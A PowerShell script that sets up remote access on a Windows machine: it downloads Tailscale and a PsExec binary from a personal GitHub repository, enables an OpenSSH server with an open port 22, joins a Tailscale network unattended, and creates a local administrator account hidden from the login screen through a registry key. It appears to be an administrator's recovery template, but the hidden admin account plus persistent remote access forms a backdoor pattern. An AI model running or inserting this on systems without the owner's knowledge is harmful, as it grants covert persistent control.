#Create temp folder:
New-Item -ItemType Directory -Path C:\Temp -Force

#download tools:
Invoke-WebRequest -Uri "https://dl.tailscale.com/stable/tailscale-setup-1.86.2-amd64.msi" -OutFile "C:\Temp\Tailscale.msi"
Invoke-WebRequest -Uri "https://github.com/Joemoma1337/Win_Scripts/raw/refs/heads/main/PsExec.exe" -OutFile C:\Temp\psexec.exe

#OpenSSH
Get-WindowsCapability -Online | Where-Object Name -like 'OpenSSH*'
Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0
Start-Service sshd
Set-Service -Name sshd -StartupType 'Automatic'

if (!(Get-NetFirewallRule -Name "OpenSSH-Server-In-TCP" -ErrorAction SilentlyContinue | Select-Object Name, Enabled)) { 
    Write-Output "Firewall Rule 'OpenSSH-Server-In-TCP' does not exist, creating it..." 
    New-NetFirewallRule -Name 'OpenSSH-Server-In-TCP' -DisplayName 'OpenSSH Server (sshd)' -Enabled True -Direction Inbound -Protocol TCP -Action Allow -LocalPort 22 
} else { 
    Write-Output "Firewall rule 'OpenSSH-Server-In-TCP' has been created and exists." 
}
Get-Service -Name "sshd"

# Install Tailscale
msiexec /i "C:\Temp\Tailscale.msi" /qn /norestart

# Wait for installation to complete and check for tailscale-ipn.exe
$timeoutSeconds = 10
$startTime = Get-Date
$processName = "tailscale-ipn"
# Loop to check for tailscale-ipn.exe for up to 10 seconds
while ($true) {
    $process = Get-Process -Name $processName -ErrorAction SilentlyContinue
    if ($process) {
        # Process found, kill it
        taskkill /IM tailscale-ipn.exe /F
        break
    }
    # Check if 10 seconds have elapsed
    if (((Get-Date) - $startTime).TotalSeconds -ge $timeoutSeconds) {
        # Timeout reached, continue
        break
    }
    # Wait 1 second before checking again
    Start-Sleep -Seconds 1
}
# Start Tailscale with auth key
& "C:\Program Files\Tailscale\tailscale.exe" up --authkey=<UPDATE-KEY> --accept-routes --accept-dns --unattended
# Verify Tailscale service
Get-Service -Name Tailscale
#Local Admin
net user RecoveryAdmin <UPDATE-PASSWORD> /add
net localgroup Administrators RecoveryAdmin /add
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v RecoveryAdmin /t REG_DWORD /d 0 /f
